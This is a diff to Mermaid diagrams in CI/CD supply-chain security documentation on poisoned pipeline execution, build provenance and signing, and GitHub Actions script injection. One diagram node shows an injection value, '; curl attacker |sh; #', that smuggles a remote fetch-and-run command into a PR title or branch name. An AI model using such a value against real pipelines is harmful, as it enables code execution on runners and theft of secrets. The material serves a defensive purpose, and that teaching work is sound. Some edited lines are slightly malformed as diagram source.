@@ -81,7 +81,7 @@ flowchart TB
 
   YAML -->|"D-PPE: edit the root"| EXEC
   YAML --> MK & PKG & DF & TST & LNT & PC & GR
-  MK -->|"I-PPE: edit a leaf<br/>the root still calls"| EXEC
+  MK -->|"I-PPE: edit a leaf<br >the root still calls"| EXEC
   PKG --> EXEC
   DF --> EXEC
   TST --> EXEC
@@ -480,7 +480,7 @@ is caught at the gate.
 ```mermaid
 flowchart LR
   SRC["Reviewed source"] --> BUILD["Isolated build (L3)"]
-  BUILD -->|"produces X<br/>digest = d(X)"| ART["Artifact X"]
+  BUILD -->|"produces X<br >digest = d X "| ART["Artifact X"]
   BUILD -->|"at build time"| PROV["Provenance: subject digest = d(X)<br/>+ signature over d(X)"]
   ART --> TAMPER{"Post-build tamper<br/>swap X → X'"}
   TAMPER -->|"if tampered"| ARTP["Artifact X'<br/>digest = d(X') ≠ d(X)"]
@@ -488,8 +488,8 @@ flowchart LR
   ARTP --> GATE
   ARTOK --> GATE
   PROV --> GATE{"Verify at publish / admission:<br/>digest match + signature valid?"}
-  GATE -->|"d(X') ≠ signed d(X)"| REJECT["REJECTED — tamper detected"]
-  GATE -->|"d(X) matches, sig valid"| ACCEPT["Accepted → deploy"]
+  GATE -->|"d X' ≠ signed d X "| REJECT["REJECTED — tamper detected"]
+  GATE -->|"d X matches sig valid"| ACCEPT["Accepted → deploy"]
 ```
 
 This is why provenance and signing are framed throughout this suite as *detection* controls, not
@@ -656,8 +656,7 @@ sequenceDiagram
 ```mermaid
 flowchart TD
     INPUT["Untrusted input<br/>PR title, branch name,<br/>issue body"] --> INTERP{"Interpolated<br/>into shell?"}
-    INTERP -->|Yes: github.event in run| INJECT["Injection:<br/>'; curl attacker | sh; #'"]
-    INTERP -->|No: via env<br/>or safe context| SAFE["Safe:<br/>input treated as data"]
+    INTERP -->|Yes: github.event in run| INJECT["Injection:<br/>'; curl attacker |sh; #'"] INTERP -->|No: via env<br/>or safe context| SAFE["Safe:<br/>input treated as data"]
 
     INJECT --> RCE["RCE on runner<br/>to secret exfil<br/>to artifact tamper"]
     style RCE fill:#f88,stroke:#900
